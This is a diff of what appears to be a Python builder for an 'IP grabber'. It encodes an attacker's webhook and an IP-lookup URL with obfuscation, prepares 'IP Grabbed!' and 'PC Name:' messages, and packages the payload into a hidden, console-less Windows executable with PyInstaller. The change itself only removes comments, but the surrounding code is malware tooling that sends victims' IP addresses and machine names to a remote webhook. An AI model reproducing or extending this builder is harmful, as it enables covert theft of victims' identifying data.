@@ -16,7 +16,6 @@ def generate_obfuscated_code(webhook):
     webhook_encoded = b64zip(webhook)
     ip_url_encoded = b64zip("https://api.ipify.org")
 
-    # Message parts (encoded in base64)
     msg_title = b64("IP Grabbed!")
     msg_ip = b64("IP Address:")
     msg_pc = b64("PC Name:")
@@ -75,7 +74,6 @@ def main():
     py_file = f"{filename}.py"
 
     try:
-        # Write the obfuscated code to the .py file
         with open(py_file, "w", encoding="utf-8") as f:
             f.write(generate_obfuscated_code(webhook))
     except Exception as e:
@@ -84,18 +82,14 @@ def main():
 
     print(f"⚙️ Building the .exe with filename {filename}.exe...")
 
-    # Use PyInstaller to build the .exe
     os.system(f'pyinstaller --onefile --noconsole --name "{filename}" "{py_file}"')
 
-    # Path of the generated .exe
     exe_path = f"dist/{filename}.exe"
     if os.path.exists(exe_path):
         shutil.move(exe_path, f"./{filename}.exe")
     else:
         print("❌ Build failed: .exe not found.")
         return
-
-    # Clean up build artifacts
     for folder in ["build", "dist"]:
         shutil.rmtree(folder, ignore_errors=True)
 
